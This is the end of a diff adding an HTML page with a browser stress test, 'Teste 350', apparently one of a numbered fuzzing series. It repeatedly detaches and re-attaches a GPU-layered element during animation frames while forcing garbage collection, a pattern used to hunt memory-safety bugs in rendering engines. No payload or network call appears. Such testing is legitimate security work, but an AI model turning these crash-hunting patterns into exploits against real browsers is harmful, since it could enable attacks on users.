+      layerEl.style.cssText = 'width:50px;height:50px;transform:translateX(0);will-change:transform;background:blue;';
+      area.appendChild(layerEl);
+
+      let rafCount350 = 0;
+      function raf350(ts){
+        rafCount350++;
+        gc();
+        if(layerEl.parentNode){ area.removeChild(layerEl); gc(); area.appendChild(layerEl); }
+        layerEl.style.transform = 'translateX(' + (rafCount350 * 5) + 'px)';
+        gc();
+        if(rafCount350 < 20) try { requestAnimationFrame(raf350); } catch(e){}
+      }
+      try { requestAnimationFrame(raf350); } catch(e){}
+    } catch(e){}
+
+    setTimeout(function(){
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      area.style.display = 'none';
+      gcHeavy();
+    }, 1500);
+  } catch(e){}
+  log('Teste 350: fim');
+}
+</script>
+</body>
+</html>
